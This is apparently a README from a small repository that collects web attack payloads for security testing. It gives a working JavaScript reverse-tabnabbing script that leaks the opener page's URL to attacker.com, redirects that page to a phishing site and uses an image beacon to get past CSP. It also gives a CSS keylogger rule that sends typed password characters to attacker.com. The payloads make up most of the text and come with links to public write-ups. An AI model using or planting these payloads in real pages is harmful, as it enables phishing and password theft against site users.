# PEN
A curated list of script and attack for security testing purposes and knowledgement.  
  
## JavaScript:
  - #### `target="_blank"` vulnerability:
    ```javascript
    if (window.opener) {
      fetch("//attacker.com/log/start/phishing/?location=" + window.opener.location)
      .then(response => {
        // Wait for the deployment of the phishing site.
        setTimeout(() => {
          // Then redirect the opener browser window to the attacker site.
          window.opener.location = 
              `https://attacker.com/${response.json().uuid}/${window.opener.location}`
              
        }, 5000)
      })
      .catch(err => {
        // Error, maybe CSP :(
        
        let bypassCSP = new Image();
        bypassCSP.src = "//attacker.com/log/?location=" + window.opener.location
      });
    }
    ```  
    References:
    - https://dev.to/ben/the-targetblank-vulnerability-by-example
  
## CSS:
  - #### CSS Keylogger: 
    ```css
    input[type="password"][value$="a"] {
      background-image: url("https://attacker.com/a");
    }
    ```  
    References:
    - https://github.com/maxchehab/CSS-Keylogging
    - https://hackaday.com/2018/02/25/css-steals-your-web-data/
